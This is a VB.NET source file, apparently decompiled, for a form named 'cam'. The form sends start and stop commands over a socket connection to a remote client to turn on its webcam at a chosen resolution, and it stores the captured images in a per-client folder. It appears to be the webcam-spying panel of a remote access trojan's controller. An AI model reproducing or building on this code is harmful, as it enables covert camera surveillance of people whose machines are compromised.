Imports Microsoft.VisualBasic.CompilerServices
Imports System
Imports System.ComponentModel
Imports System.Diagnostics
Imports System.Drawing
Imports System.IO
Imports System.Runtime.CompilerServices
Imports System.Windows.Forms

Public Class cam
    Public folder As String
    Public osk As Client
    Public QQ As String
    Public sk As Client

    Private Sub Button1_Click(ByVal sender As Object, ByVal e As EventArgs) Handles Button1.Click
        Try
            If (Me.Button1.Text = "Start") Then
                Me.Button1.Text = "Stop"
                Me.sk.Send(String.Concat(New String() {"!", ind.Y, Conversions.ToString(Me.ComboBox1.SelectedIndex), ind.Y, Me.ComboBox2.Text}))
            Else
                Me.Button1.Text = "Start"
                Me.sk.Send("@")
            End If
        Catch exception1 As Exception
            ProjectData.SetProjectError(exception1)
            Dim exception As Exception = exception1
            ProjectData.ClearProjectError()
        End Try
    End Sub

    Private Sub Cam_FormClosing(ByVal sender As Object, ByVal e As FormClosingEventArgs) Handles MyBase.FormClosing
        Try
            If Me.sk.CN Then
                Me.sk.Send("@")
            End If
            Me.sk.CN = False
        Catch exception1 As Exception
            ProjectData.SetProjectError(exception1)
            Dim exception As Exception = exception1
            ProjectData.ClearProjectError()
        End Try
    End Sub

    Private Sub Cam_Load(ByVal sender As Object, ByVal e As EventArgs) Handles MyBase.Load
        Try
            Me.QQ = Conversions.ToString(ind.vno(Me.osk.L))
            Me.Text = Me.QQ
            Me.ComboBox2.SelectedIndex = 3
            Me.Timer1.Enabled = True
            Me.folder = (Me.osk.Folder & "Cam\")
            If Not Directory.Exists(Me.folder) Then
                Directory.CreateDirectory(Me.folder)
            End If
            Me.Button1.Text = "Stop"
            Me.sk.Send(String.Concat(New String() {"!", ind.Y, Conversions.ToString(Me.ComboBox1.SelectedIndex), ind.Y, Me.ComboBox2.Text}))
        Catch exception1 As Exception
            ProjectData.SetProjectError(exception1)
            Dim exception As Exception = exception1
            Me.Close()
            ProjectData.ClearProjectError()
        End Try
    End Sub

    Private Sub CheckBox3_CheckedChanged(ByVal sender As Object, ByVal e As EventArgs) Handles CheckBox3.CheckedChanged
        If Me.CheckBox3.Checked Then
            Try
                Process.Start(Me.folder)
            Catch exception1 As Exception
                ProjectData.SetProjectError(exception1)
                Dim exception As Exception = exception1
                ProjectData.ClearProjectError()
            End Try
        End If
    End Sub

    Private Sub Timer1_Tick(ByVal sender As Object, ByVal e As EventArgs) Handles Timer1.Tick
        Try
            If ((Me.osk Is Nothing) Or (Me.sk Is Nothing)) Then
                Me.Close()
            ElseIf (Not Me.osk.CN Or Not Me.sk.CN) Then
                Me.Close()
            End If
        Catch exception1 As Exception
            ProjectData.SetProjectError(exception1)
            Dim exception As Exception = exception1
            ProjectData.ClearProjectError()
        End Try
    End Sub

End Class